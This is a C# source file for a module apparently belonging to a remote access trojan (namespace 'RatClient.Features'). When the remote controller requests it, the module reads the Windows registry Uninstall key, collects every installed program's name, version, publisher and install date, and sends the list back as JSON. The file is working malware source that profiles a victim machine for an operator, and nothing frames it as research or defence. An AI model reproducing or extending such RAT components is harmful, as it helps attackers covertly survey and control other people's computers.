using System;
using System.Collections.Generic;
using Microsoft.Win32;
using System.Web.Script.Serialization;

namespace RatClient.Features
{
    public class ApplicationEnumeration
    {
        private readonly Action<object> SendJson;

        public ApplicationEnumeration(Action<dynamic> SendJson)
        {
            this.SendJson = SendJson;
            Program.MessageReceived += HandleMessage;
        }

        private void HandleMessage(dynamic message)
        {
            if (message["type"] == "request_applications")
            {
                SendApplications();
            }
        }

        public void SendApplications()
        {
            try
            {
                var applications = GetInstalledApplications();
                var serializedApplications = new JavaScriptSerializer().Serialize(applications);
                SendJson(new { type = "applications", data = serializedApplications });
            }
            catch (Exception ex)
            {
                SendJson(new { type = "error", message = "Error retrieving applications: " + ex.Message });
            }
        }

        private List<ApplicationModel> GetInstalledApplications()
        {
            var applications = new List<ApplicationModel>();

            string registry_key = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall";
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(registry_key))
            {
                foreach (string subkey_name in key.GetSubKeyNames())
                {
                    using (RegistryKey subkey = key.OpenSubKey(subkey_name))
                    {
                        try
                        {
                            string displayName = subkey.GetValue("DisplayName") as string;
                            string displayVersion = subkey.GetValue("DisplayVersion") as string;
                            string publisher = subkey.GetValue("Publisher") as string;
                            string installDate = subkey.GetValue("InstallDate") as string;

                            if (!string.IsNullOrEmpty(displayName))
                            {
                                applications.Add(new ApplicationModel
                                {
                                    Name = displayName,
                                    Version = displayVersion ?? "Unknown",
                                    Publisher = publisher ?? "Unknown",
                                    InstallDate = installDate ?? "Unknown"
                                });
                            }
                        }
                        catch (Exception)
                        {
                            // Skip any problematic entries
                        }
                    }
                }
            }

            return applications;
        }
    }

    public class ApplicationModel
    {
        public string Name { get; set; }
        public string Version { get; set; }
        public string Publisher { get; set; }
        public string InstallDate { get; set; }
    }
}